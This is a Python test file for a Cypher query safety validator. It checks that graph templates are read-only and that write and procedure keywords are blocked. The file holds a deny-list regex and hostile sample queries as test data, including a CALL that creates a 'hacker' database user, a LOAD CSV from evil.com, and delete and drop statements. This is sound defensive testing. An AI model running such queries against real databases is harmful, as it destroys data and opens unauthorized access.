"""Tests for Cypher safety validation and template lookups."""

import re

from app.graph_db.templates import CYPHER_TEMPLATES
from app.tools.neo4j_tools import _validate_cypher


_DANGEROUS_PATTERN = re.compile(
    r"\b(CREATE|MERGE|SET|DELETE|REMOVE|DROP|DETACH|CALL|FOREACH|LOAD\s+CSV|PERIODIC\s+COMMIT)\b",
    re.IGNORECASE,
)


def test_all_templates_are_read_only():
    """Every pre-built template must only contain read operations."""
    for name, tmpl in CYPHER_TEMPLATES.items():
        query = tmpl["query"]
        match = _DANGEROUS_PATTERN.search(query)
        assert match is None, (
            f"Template '{name}' contains dangerous keyword: {match.group()}"
        )


def test_templates_have_required_fields():
    for name, tmpl in CYPHER_TEMPLATES.items():
        assert "query" in tmpl, f"Template '{name}' missing 'query'"
        assert "parameters" in tmpl, f"Template '{name}' missing 'parameters'"
        assert "description" in tmpl, f"Template '{name}' missing 'description'"


def test_template_disease_full_info_uses_parameter():
    tmpl = CYPHER_TEMPLATES["disease_full_info"]
    assert "$disease_name" in tmpl["query"]
    assert "disease_name" in tmpl["parameters"]


# ---------------------------------------------------------------------------
# Cypher validation tests (blacklist + whitelist)
# ---------------------------------------------------------------------------

def test_validate_blocks_create():
    assert _validate_cypher("CREATE (n:Node {name: 'x'})") is not None


def test_validate_blocks_merge():
    assert _validate_cypher("MERGE (n:Node {name: 'x'})") is not None


def test_validate_blocks_set():
    assert _validate_cypher("MATCH (n) SET n.x = 1") is not None


def test_validate_blocks_delete():
    assert _validate_cypher("MATCH (n) DELETE n") is not None


def test_validate_blocks_detach_delete():
    assert _validate_cypher("MATCH (n) DETACH DELETE n") is not None


def test_validate_blocks_drop():
    assert _validate_cypher("DROP INDEX idx") is not None


def test_validate_blocks_call():
    """CALL can execute stored procedures — must be blocked."""
    assert _validate_cypher("CALL dbms.security.createUser('hacker', 'pwd')") is not None


def test_validate_blocks_load_csv():
    """LOAD CSV enables SSRF attacks — must be blocked."""
    assert _validate_cypher("LOAD CSV FROM 'http://evil.com/data.csv' AS row") is not None


def test_validate_blocks_foreach():
    """FOREACH can wrap write operations — must be blocked."""
    assert _validate_cypher("MATCH (n) FOREACH (x IN [1] | SET n.val = x)") is not None


def test_validate_allows_read():
    assert _validate_cypher("MATCH (n) RETURN n LIMIT 10") is None


def test_validate_allows_optional_match():
    assert _validate_cypher("MATCH (n)-[r]->(m) OPTIONAL MATCH (m)-[:X]->(o) RETURN n, r, m, o") is None


def test_validate_allows_unwind():
    assert _validate_cypher("UNWIND $names AS name MATCH (n {name: name}) RETURN n") is None


def test_validate_allows_with_where():
    assert _validate_cypher("MATCH (n) WITH n WHERE n.age > 10 RETURN n") is None


def test_validate_case_insensitive():
    """Detection should be case-insensitive."""
    assert _validate_cypher("create (n:X)") is not None
    assert _validate_cypher("CaLl dbms.foo()") is not None
